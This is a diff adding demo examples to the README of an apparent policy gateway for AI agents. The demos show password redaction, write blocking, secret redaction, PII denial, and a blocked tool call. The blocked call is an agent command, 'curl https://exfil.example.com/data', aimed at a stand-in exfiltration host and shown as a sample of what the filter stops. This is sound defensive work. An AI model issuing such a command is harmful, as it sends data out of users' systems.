@@ -121,6 +121,70 @@ scope: anthropic-gateway
 
 The agent sets `ANTHROPIC_BASE_URL=http://localhost:8080`. Keep filters what the model sees (request) and what the model wants to do (response).
 
+## Demos
+
+<details>
+<summary><strong>MCP Relay: Read-only database with password redaction</strong></summary>
+
+The relay sits between Claude and a sqlite MCP server. Two policies are enforced: passwords are redacted from query results, and write operations are blocked entirely.
+
+**"List all users in the database"** — passwords replaced with `********`:
+
+```
+┌────┬─────────────┬───────────────────┬──────────┬──────────┐
+│ id │    name     │       email       │ password │   role   │
+├────┼─────────────┼───────────────────┼──────────┼──────────┤
+│ 1  │ Alice Chen  │ alice@company.com │ ******** │ admin    │
+│ 2  │ Bob Park    │ bob@company.com   │ ******** │ editor   │
+│ 3  │ Carol White │ carol@company.com │ ******** │ viewer   │
+│ …  │ …           │ …                 │ ******** │ …        │
+└────┴─────────────┴───────────────────┴──────────┴──────────┘
+```
+
+**"Add a new user named Test User"** — write blocked before reaching the database:
+
+```
+Error: policy denied: Database is read-only. Write operations are not permitted. (rule: block-writes)
+```
+
+The agent never sees the real passwords. The database never sees the write. Policy is enforced at the API layer, outside the model's control.
+
+**Try it:** `./examples/mcp-relay-demo/demo.sh` (requires `sqlite3` and `uvx`)
+
+</details>
+
+<details>
+<summary><strong>LLM Gateway: Secret redaction, PII blocking, and command filtering</strong></summary>
+
+The gateway sits between your agent and the Anthropic API. It decomposes messages into per-block policy calls, filtering both what the model sees and what it tries to do.
+
+**Secret redaction** — credentials are stripped before reaching the model:
+
+```
+User:  "Deploy with key AKIAIOSFODNN7EXAMPLE"
+Model: "Deploy with key [REDACTED:aws-access-key-id]"
+```
+
+**PII blocking** — prompts containing email addresses are denied:
+
+```
+User:  "Summarize this complaint from jane.doe@acmecorp.com"
+Error: PII detected in prompt. Use opaque customer IDs. (rule: block-pii-in-prompts)
+```
+
+**Command filtering** — dangerous tool use is blocked:
+
+```
+Model: tool_use: Bash(command: "curl https://exfil.example.com/data")
+Error: Network access is blocked by policy. (rule: block-networking)
+```
+
+The agent sets `ANTHROPIC_BASE_URL=http://localhost:8080` and uses Claude normally. Keep filters both directions transparently.
+
+**Try it:** `./examples/llm-gateway-demo/demo.sh` (requires an Anthropic API key)
+
+</details>
+
 ## Configuration
 
 Rule files are pure policy -- no transport details:
